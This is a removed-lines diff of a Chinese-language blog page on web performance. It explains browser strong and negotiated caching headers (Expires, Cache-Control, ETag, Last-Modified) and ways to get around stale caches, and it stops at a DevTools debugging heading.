-                  <a href="/categories/Performance/" itemprop="url" rel="index">
-                    <span itemprop="name">Performance</span>
-                  </a>
-                </span>
-
-                
-                
-
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-
-          
-          
-
-          
-        </div>
-      </header>
-    
-
-
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h1 id="性能"><a href="#性能" class="headerlink" title="性能"></a>性能</h1><hr>
-<h2 id="缓存"><a href="#缓存" class="headerlink" title="缓存"></a>缓存</h2><p>良好的缓存策略可以降低资源的重复加载提高网页的整体加载速度，通常浏览器缓存策略分为两种：强缓存和协商缓存</p>
-<h3 id="强缓存"><a href="#强缓存" class="headerlink" title="强缓存"></a>强缓存</h3><blockquote>
-<p>在<em>响应头</em>中添加 <code>Expires: Thu, 28 Dec 2019 05:27:45 GMT</code> 或 <code>Cache-Control: public, max-age=2592000</code> 来控制强缓存。</p>
-<ul>
-<li>Expires 是 HTTP/1.0 的字段，它规定了缓存过期的一个绝对时间，过期后需再次请求。缺点：Expires 使用的是客户端本机时间不准确，所以引入了 Cache-Control:max-age。</li>
-<li>Cache-Control 是 HTTP/1.1 的字段，它规定了缓存过期的一个相对时间。优先级：Cache-Control &gt; Expires。常用指令如下：<br>public: 任意一方都能缓存该资源(客户端、代理服务器等)。<br>max-age(秒)：缓存的时长，也是响应的最大的Age值。<br>s-maxage(秒)：公共缓存服务器响应的最大Age值。</li>
-<li>强缓存阶段如果本地缓存没有过期则服务端返回200 (from disk cache)或是200 OK (from memory cache)</li>
-</ul>
-</blockquote>
-<h3 id="协商缓存"><a href="#协商缓存" class="headerlink" title="协商缓存"></a>协商缓存</h3><blockquote>
-<p>在<em>请求头</em>中添加 <code>If-Modified-Since: Tue, 28 Nov 2019 05:14:02 GMT</code> 或 <code>If-None-Match: W/&quot;5a1cf09a-63c6&quot;</code> 开启协商缓存。</p>
-<ul>
-<li>If-Modified-Since 中携带的信息为该资源上次请求的响应头中的 Last-Modified 字段。If-None-Match 中携带的信息为该资源上次请求的响应头中的 ETag 字段。服务器通过这两个字段来判断资源是否有修改，如果有修改则返回状态码200和新的内容，如果没有修改返回状态码304。</li>
-<li>Last-Modified 是 HTTP/1.0 的字段。在第一次请求改资源时把这个标识放到响应头传到客户端，标记此资源在服务器端最后被修改的时间。缺点：如果某个资源只是修改了，但实际内容并没有发生变化，Last-Modified 无法判断出来。</li>
-<li>ETag 是 HTTP/1.1 的字段。服务器通过某种算法对资源生成一个唯一的标识。在第一次请求该资源时把这个标识放到响应头传到客户端。优先级：ETag &gt; Last-Modified</li>
-</ul>
-</blockquote>
-<h3 id="常见问题："><a href="#常见问题：" class="headerlink" title="常见问题："></a>常见问题：</h3><ol>
-<li>请求被缓存，导致新代码未生效？</li>
-</ol>
-<ul>
-<li>服务端响应添加Cache-Control:no-cache,must-revalidate;指定不使用强缓存。</li>
-<li>修改请求头If-modified-since:0或If-none-match:””</li>
-<li>修改请求URL，请求URL后加随机数，随机数可以是时间戳，哈希值，比如：<a href="http://xxxx.com?a=123412323" target="_blank" rel="noopener">http://xxxx.com?a=123412323</a></li>
-<li>通过 webpack contentHash 每次文件内容改变了则改变文件名</li>
-</ul>
-<h2 id="chrome-devtools-调试"><a href="#chrome-devtools-调试" class="headerlink" title="chrome devtools 调试"></a>chrome devtools 调试</h2>
           
         
       
